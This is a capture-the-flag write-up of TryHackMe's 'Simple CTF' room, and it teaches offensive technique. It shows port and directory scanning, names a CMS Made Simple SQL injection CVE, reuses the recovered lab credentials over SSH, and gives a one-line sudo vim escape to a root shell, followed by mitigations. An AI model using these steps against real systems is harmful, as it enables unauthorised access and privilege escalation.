---
description: Beginner level ctf
---

# Simple CTF

The room can be accessed [here](https://tryhackme.com/room/easyctf)

## Information Gathering

I typically start with a Rustscan, simply because it gives me open ports faster. Once I get this, I might use Nmap for specific ports.

### Rustscan Scan

```bash
┌──(lvksus㉿kali)-[~]
└─$ rustscan -a 10.10.37.78 --ulimit 5000                                  1 ⨯
.----. .-. .-. .----..---.  .----. .---.   .--.  .-. .-.
| {}  }| { } |{ {__ {_   _}{ {__  /  ___} / {} \ |  `| |
| .-. \| {_} |.-._} } | |  .-._} }\     }/  /\  \| |\  |
`-' `-'`-----'`----'  `-'  `----'  `---' `-'  `-'`-' `-'
The Modern Day Port Scanner.
________________________________________
: https://discord.gg/GFrQsGy           :
: https://github.com/RustScan/RustScan :
 --------------------------------------
😵 https://admin.tryhackme.com

[~] The config file is expected to be at "/home/lvksus/.rustscan.toml"
[~] Automatically increasing ulimit value to 5000.
Open 10.10.37.78:21
Open 10.10.37.78:80
Open 10.10.37.78:2222
[~] Starting Script(s)
[>] Script to be run Some("nmap -vvv -p {{port}} {{ip}}")

[~] Starting Nmap 7.92 ( https://nmap.org ) at 2022-02-01 22:54 EST
Initiating Ping Scan at 22:54
Scanning 10.10.37.78 [2 ports]
Completed Ping Scan at 22:54, 2.09s elapsed (1 total hosts)
Initiating Parallel DNS resolution of 1 host. at 22:54
Completed Parallel DNS resolution of 1 host. at 22:54, 0.00s elapsed
DNS resolution of 1 IPs took 0.01s. Mode: Async [#: 1, OK: 0, NX: 1, DR: 0, SF: 0, TR: 1, CN: 0]
Initiating Connect Scan at 22:54
Scanning 10.10.37.78 [3 ports]
Discovered open port 21/tcp on 10.10.37.78
Discovered open port 2222/tcp on 10.10.37.78
Discovered open port 80/tcp on 10.10.37.78
Completed Connect Scan at 22:54, 1.45s elapsed (3 total ports)
Nmap scan report for 10.10.37.78
Host is up, received syn-ack (0.20s latency).
Scanned at 2022-02-01 22:54:19 EST for 1s

PORT     STATE SERVICE      REASON
21/tcp   open  ftp          syn-ack
80/tcp   open  http         syn-ack
2222/tcp open  EtherNetIP-1 syn-ack

Read data files from: /usr/bin/../share/nmap
Nmap done: 1 IP address (1 host up) scanned in 3.59 seconds
```

### Nmap Scan

```bash
┌──(lvksus㉿kali)-[~/Documents/tryhackme/simple_ctf]
└─$ nmap -sV 10.10.37.78                             
Starting Nmap 7.92 ( https://nmap.org ) at 2022-02-01 22:55 EST
Nmap scan report for 10.10.37.78
Host is up (0.090s latency).
Not shown: 997 filtered tcp ports (no-response)
PORT     STATE SERVICE VERSION
21/tcp   open  ftp     vsftpd 3.0.3
80/tcp   open  http    Apache httpd 2.4.18 ((Ubuntu))
2222/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.8 (Ubuntu Linux; protocol 2.0)
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 14.57 seconds
```

Right away, seeing port 2222 for SSH is very strange. We see that FTP is using version vsftpd 3.0.3 and the HTTP website is running on Apache version 2.4.18

## Enumeration

### Dirsearch

I use my favorite directory brute-forcer to look for any directories that might seem interesting

```bash
┌──(lvksus㉿kali)-[~]
└─$ dirsearch -u http://10.10.37.78 -w /usr/share/dirb/wordlists/common.txt -x 404 -t 100

  _|. _ _  _  _  _ _|_    v0.4.2
 (_||| _) (/_(_|| (_| )

Extensions: php, aspx, jsp, html, js | HTTP method: GET | Threads: 100 | Wordlist size: 4613

Output File: /home/lvksus/.dirsearch/reports/10.10.37.78/_22-02-01_23-11-21.txt

Error Log: /home/lvksus/.dirsearch/logs/errors-22-02-01_23-11-21.log

Target: http://10.10.37.78/

[23:11:21] Starting: 
[23:11:30] 200 -   11KB - /index.html                                       
[23:11:35] 200 -  929B  - /robots.txt                                       
[23:11:35] 403 -  299B  - /server-status                                    
[23:11:35] 301 -  311B  - /simple  ->  http://10.10.37.78/simple/           
                                                                             
Task Completed
```

![CMS Made Simple Version](<../../.gitbook/assets/C\_\_Users\_madam\_Documents\_Cybersecurity\_OffSec\_WriteUps\_THM\_Simple CTF\_Simple CTF Images\_CMS Made Simple Version.png>)

![CMS Made Simple Admin Login](<../../.gitbook/assets/C\_\_Users\_madam\_Documents\_Cybersecurity\_OffSec\_WriteUps\_THM\_Simple CTF\_Simple CTF Images\_CMS Admin Console.png>)

## Vulnerability Assessment

This Content Management System is vulnerable to [CVE-2019-9053: Unauthenticated SQL Injection on CMS Made Simple <= 2.2.9](https://www.exploit-db.com/exploits/46635)

### Proof of Concept

As shown in the image below, we see that the site produces output when we use some kind of SQL statement

![](<../../.gitbook/assets/C\_\_Users\_madam\_Documents\_Cybersecurity\_OffSec\_WriteUps\_THM\_Simple CTF\_Simple CTF Images\_POC.png>)

{% hint style="info" %}
Used this for termcolor issue when trying to run the exploit

[https://www.reddit.com/r/tryhackme/comments/p6v195/help\_with\_simple\_ctf/](https://www.reddit.com/r/tryhackme/comments/p6v195/help\_with\_simple\_ctf/)
{% endhint %}

![](<../../.gitbook/assets/C\_\_Users\_madam\_Documents\_Cybersecurity\_OffSec\_WriteUps\_THM\_Simple CTF\_Simple CTF Images\_Exploit (1).png>)

### Credentials

username: <mark style="color:green;">`mitch`</mark>\
email: <mark style="color:green;">`admin@admin.com`</mark>\
password: <mark style="color:green;">`secret`</mark>

With these credentials and knowing the fact that SSH port 2222 was open, it would make the most sense to see if we can log into that service

![](<../../.gitbook/assets/C\_\_Users\_madam\_Documents\_Cybersecurity\_OffSec\_WriteUps\_THM\_Simple CTF\_Simple CTF Images\_ssh+user.txt.png>)

As we see, they work and we are able to grab the user.txt

## Privilege Escalation

Next comes privilege escalation. Let's see what commands mitch is able to run as root

![](<../../.gitbook/assets/C\_\_Users\_madam\_Documents\_Cybersecurity\_OffSec\_WriteUps\_THM\_Simple CTF\_Simple CTF Images\_Pasted image 20220202112308.png>)

Vim is a very powerful text editor. We'll check out the infamous GTFObins for a list of Unix binaries that can be used to bypass local security restrictions in misconfigured systems

In our case, we want to be able to run Vim in such a way that will grant our low privilege user the ability to become root

[https://gtfobins.github.io/gtfobins/vim/#sudo](https://gtfobins.github.io/gtfobins/vim/#sudo)

![](<../../.gitbook/assets/C\_\_Users\_madam\_Documents\_Cybersecurity\_OffSec\_WriteUps\_THM\_Simple CTF\_Simple CTF Images\_sudo vim.png>)

Just from a simple line of input, we are now root

```bash
mitch@Machine:/home$ sudo -l
User mitch may run the following commands on Machine:
    (root) NOPASSWD: /usr/bin/vim
mitch@Machine:/home$ sudo /usr/bin/vim -c ':!/bin/bash'

root@Machine:/home# id
uid=0(root) gid=0(root) groups=0(root)
root@Machine:/home# 
```

## Root Flag

![](<../../.gitbook/assets/C\_\_Users\_madam\_Documents\_Cybersecurity\_OffSec\_WriteUps\_THM\_Simple CTF\_Simple CTF Images\_rootFlag.png>)

## Mitigations

### **Password Change**

The user 'Mitch' should change their password to something secure such as: <mark style="color:green;">`Jlds#5@asd53Z`</mark>

### **SQLi Sanitization**

* Client-Side and Server-Side input validation and sanitization
* Secure Coding & SDLC

### Removal of root privileges

* Unless there's a justifiable reason that mitch should be able to run Vim as root, those privileges should be taken away
